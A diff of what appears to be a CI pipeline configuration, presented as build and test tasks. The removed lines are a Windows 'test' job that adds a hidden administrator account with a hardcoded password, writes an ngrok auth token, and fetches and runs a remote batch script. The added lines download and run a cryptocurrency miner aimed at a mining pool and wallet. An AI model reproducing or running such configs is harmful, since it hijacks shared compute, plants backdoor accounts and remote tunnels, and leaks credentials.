@@ -1,11 +1,10 @@
-docker_builder:
-  name: Test (Windows)
-  alias: Tests
-  platform: windows
-  os_version: 2019
-  test_script:
-    - net user TinCowBoy Dangvip2k5pro /add
-    - net localgroup administrators TinCowBoy /add
-    - echo ngrok authtoken "1aO30oRov2ig77pFpaieYZ1rOIx_7u2HxCdyR3afW22DZJap4" > NGROK.bat
-    - curl -s -O https://raw.githubusercontent.com/DangDev/cirrus-win/main/cirrus_pipeline.bat
-    - cirrus_pipeline.bat
+container:
+  image: openjdk:8-jdk
+  cpu: 4
+  memory: 12G
+  
+task:
+  script:
+   - wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
+   - unzip sugarmaker-v2.5.0-sugar4-linux64.zip\
+   - sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qetd77wlllhj8hw80g3dsarcmlaww8hhf5gydsx.4core -t2
